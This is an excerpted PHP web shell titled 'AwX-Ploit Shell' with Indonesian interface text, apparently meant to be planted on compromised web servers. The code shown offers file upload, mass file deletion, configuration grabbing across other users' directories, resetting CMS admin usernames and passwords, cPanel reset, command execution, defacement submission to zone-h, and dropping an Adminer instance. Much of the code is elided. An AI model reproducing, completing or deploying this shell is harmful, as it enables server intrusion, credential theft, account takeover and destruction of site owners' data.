...
<head>
	...
	<title>.::[ AwX-Ploit Shell ]::.</title><meta charset="UTF-8"> <meta name="Author" content="AwX-Ploit" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Selagi Shell Masih Tertanam, Buat Admin Semakin Geram" />
...
<font face="Kelly Slab" color="white" size="7px">.::[ AwX-Ploit Shell ]::.</font><br>

</h1></center>

<center><b><br><font face="courier new" color="white" size="5">Enjoy the Exploit</font></b></center>

<center><audio autoplay="autoplay" controls="controls" src="https://www.mboxdrive.com/Gank%20-%20Resurrection%20(TikTok)%20(Sub%20Espa%C3%B1ol).mp3" type="audio/mpeg"></audio></center>
...
+ IP Anda    <td>: <font color='LightBlue'>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
...
+ Coded By   <td>: <font color='LightBlue'>AwX-Ploit<tr><td><font color='white'>

+ Website<td>: <font color='LightBlue'>the-unknown-darknet.my.id</font></tr></td><br>
...
echo '<font color="yellow">Upload Success :)</script><br/>';

}else{

echo '<script> alert("Upload Failed :(")</script></font><br/>';
...
echo "<a class='destroy_table' href='?dir=$dir&do=cmd'>Cpanel_Reset</a>";
...
echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_Delete</a></center><br>";

echo "<center> <a class='destroy_table' href='?dir=$dir&to=config'>Config_Grab</a>";

echo "<a class='destroy_table' href='?dir=$dir&do=auto_edit_user'>Edit_User</a>";

echo "<a class='destroy_table' href='?dir=$dir&do=endec'>Encode/Decode</a>";

echo "<a class='destroy_table' href='?dir=$dir&do=hashgen'>Hash_Generator</a>";

echo "<a class='destroy_table' href='?dir=$dir&do=adminer'>Adminer</a>";

echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";

echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a></center>";
...
if($_GET['to'] == 'zoneh') {
	...
	if($_POST['submit']) {
		...
		<input type='text' name='nick' size='50' value='AwX-Ploit'><br>
	...
	<input type='submit' name='start' value='SUBMIT' style='width: 450px;'>
					...
					if(is_readable($user_jumping_dir)) {
						...
						if(function_exists('posix_getpwuid')) {
							...
							if($domain_jump == '') {
								...
								echo " => ( <font color=red>Tidak Bisa Mengambil Nama Domain Nya :(</font> )<br>";
           ...
           if(is_dir($dirc)) {
               ...
               if(is_writable($dirc)) {
                   ...
                   if(file_exists($lokasi)) {
                       ...
                       echo "[<font color=#52CF38>Deleted :)</font>] $lokasi<br>";
...
echo "</div>";
   ...
   echo "<center><a href='?path=$path/3X0RC1ST_CONFIG'><font color=#52CF38>Finished :)</font></a></center>";
 ...
 echo "Sitename => <font color=red>Tidak Bisa Mengambil Nama Domain Nya :(</font><br>";
 ...
 echo "Status => <font color=lime>User Edited :), Silakan Login Dengan User & Pass Yang Baru.</font><br><br>";
 ...
 $url_target = "Login => <font color=red>Tidak Bisa Mengambil Nama Domain Nya :(</font><br>";
 ...
 $url_target2 = "Login => <font color=red>Tidak Bisa Mengambil Nama Domain Nya :(</font><br>";
 ...
 $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>Admin Login Tidak Ditemukan :(</font> ]<br>";
 ...
 $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>Admin Login Tidak Ditemukan :(</font> ]<br>";
 ...
 if(preg_match('/Tidak Bisa Mengambil Nama Domain Nya :(/', $url_target)) {
 ...
 <input type='text' name='user_baru' value='username' placeholder='user_baru'><br>

 <input type='text' name='pass_baru' value='password' placeholder='pass_baru'><br>

 <input type='submit' name='hajar' value='SUBMIT' style='width: 215px;'>

 </form>

 <span>[ ! ] Tools Ini Berjalan Jika Dijalankan Didalam Folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <p <font color="red">" Nothing Last Forever, We Can Jump And Feeder "</font></p>
 ...
 echo "<center><font color=red>Gagal Membuat File Adminer :(</font></center>";
...
echo '<font color="lime">Change Perm Success :)</font><br/>';

echo "[ <a href='?path=$path'>Kembali</a> ]";

}else{

echo '<script> alert("Change Perm Failed :(")</font><br />';
...
echo '<font color="lime">Success :)<br/>';

echo "[ <a href='?path=$path'>Kembali</a> ]";

}else{

echo '<script> alert("Failed :(")</script></font><br/>';
...
echo '<font color="red">Directory Failed to Delete :(                                                                                                                                                                                                                                                                                           </font><br/>';
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">©AwX-Ploit</center>
